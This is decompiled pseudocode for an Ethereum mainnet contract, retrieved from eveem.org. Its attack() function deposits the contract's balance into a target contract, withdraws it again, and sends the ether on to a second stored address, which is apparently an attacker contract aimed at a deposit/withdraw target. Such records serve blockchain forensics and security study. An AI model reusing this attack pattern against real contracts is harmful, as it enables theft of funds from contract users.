# contract source code retrieved from eveem.org
# retrieved on 2019-12-03

#  addr = 0x4AfB544Eb87265cF7Fc8fdB843c81d34F7E2A369 
#  network = mainnet 
#  ver = 26 Apr 2019 
#  problems = {} 

# storage definitions
def storage:
    # storage address 0
    stor0 # mask: a s
    # storage address 1
    stor1 # mask: a s
    # storage address 2
    stor2 # mask: a s
# hash = 0x9e5faafc
# getter = None
# const = None
# payable = True
def attack() payable: 
  stor2 = eth.balance(this.address)
  call stor0.deposit() with:
     value stor2 wei
       gas gas_remaining - 34050 wei
  require ext_call.success
  call stor0.withdraw(uint256 wdamount) with:
       gas gas_remaining - 25050 wei
      args stor2
  call stor1 with:
     value eth.balance(this.address) wei
       gas 0 wei


# hash = _fallback()
# getter = None
# const = None
# payable = True
def _fallback() payable: # default function
  revert 


